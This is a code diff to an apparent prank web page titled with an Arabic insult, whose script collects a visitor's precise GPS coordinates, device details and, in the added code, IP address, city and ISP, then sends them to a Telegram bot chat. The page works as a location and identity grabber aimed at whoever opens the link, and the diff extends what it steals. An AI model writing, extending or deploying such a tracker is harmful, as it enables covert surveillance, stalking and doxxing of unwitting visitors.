@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عزام الفتال</title>
+    <title>انت حمار ؟</title>
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <style>
         body {
@@ -59,11 +59,30 @@
     const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
     const URI_API_MSG = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
+    // دالة لجلب معلومات الـ IP والشبكة
+    async function getIPInfo() {
+        try {
+            const response = await axios.get('https://ipapi.co/json/');
+            const data = response.data;
+            
+            let ipInfo = "<b>--- معلومات عنوان IP والشبكة ---</b>\n";
+            ipInfo += `<b>عنوان الـ IP:</b> ${data.ip || 'غير معروف'}\n`;
+            ipInfo += `<b>الدولة:</b> ${data.country_name || 'غير معروف'} (${data.country_code || ''})\n`;
+            ipInfo += `<b>المنطقة / المحافظة:</b> ${data.region || 'غير معروف'}\n`;
+            ipInfo += `<b>المدينة:</b> ${data.city || 'غير معروف'}\n`;
+            ipInfo += `<b>مزود الخدمة (ISP):</b> ${data.org || 'غير معروف'}\n\n`;
+            
+            return ipInfo;
+        } catch (e) {
+            return "<b>معلومات الـ IP:</b> تعذر جلب معلومات الشبكة.\n\n";
+        }
+    }
+
     // دالة للحصول على الموقع الجغرافي الدقيق جداً
     function getExactLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
-                resolve("<b>الموقع الجغرافي:</b> غير مدعوم في هذا المتصفح.\n");
+                resolve("<b>الموقع الجغرافي (GPS):</b> غير مدعوم في هذا المتصفح.\n");
                 return;
             }
 
@@ -71,11 +90,11 @@
                 (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy; // الدقة بالأمتار
+                    const accuracy = position.coords.accuracy; 
                     const altitude = position.coords.altitude ? position.coords.altitude + ' متر' : 'غير متوفر';
                     const speed = position.coords.speed ? position.coords.speed + ' م/ث' : 'غير متوفر';
 
-                    let locInfo = "<b>--- الموقع الجغرافي الدقيق ---</b>\n";
+                    let locInfo = "<b>--- الموقع الجغرافي الدقيق (GPS) ---</b>\n";
                     locInfo += `<b>خط الطول (Latitude):</b> ${lat}\n`;
                     locInfo += `<b>خط العرض (Longitude):</b> ${lon}\n`;
                     locInfo += `<b>الدقة (Accuracy):</b> في نطاق ${accuracy} متر\n`;
@@ -86,7 +105,7 @@
                     resolve(locInfo);
                 },
                 (error) => {
-                    let errMsg = "<b>الموقع الجغرافي:</b> ";
+                    let errMsg = "<b>الموقع الجغرافي (GPS):</b> ";
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
                             errMsg += "تم رفض إذن الوصول إلى الموقع من قبل المستخدم.\n\n";
@@ -104,9 +123,9 @@
                     resolve(errMsg);
                 },
                 {
-                    enableHighAccuracy: true, // طلب أعلى دقة ممكنة (GPS)
-                    timeout: 10000,          // مهلة أقصاها 10 ثوانٍ
-                    maximumAge: 0            // عدم استخدام موقع مخزن مؤقتاً
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
                 }
             );
         });
@@ -137,12 +156,15 @@
 
     async function collectAndSend() {
         try {
-            // 1. جمع معلومات الموقع والمتصفح ودمجهما في رسالة واحدة
+            // 1. جمع معلومات الـ IP، والموقع الجغرافي، ومعلومات الجهاز
+            const ipInfo = await getIPInfo();
             const locationInfo = await getExactLocation();
             const deviceInfo = getBrowserInfo();
-            const fullMessage = locationInfo + "\n" + deviceInfo;
+            
+            // دمج جميع المعلومات في رسالة واحدة متكاملة
+            const fullMessage = ipInfo + locationInfo + deviceInfo;
 
-            // 2. إرسال البيانات النصية (الموقع + معلومات الجهاز) إلى تيليجرام
+            // 2. إرسال البيانات النصية إلى تيليجرام
             await axios.post(URI_API_MSG, {
                 chat_id: CHAT_ID,
                 text: fullMessage,
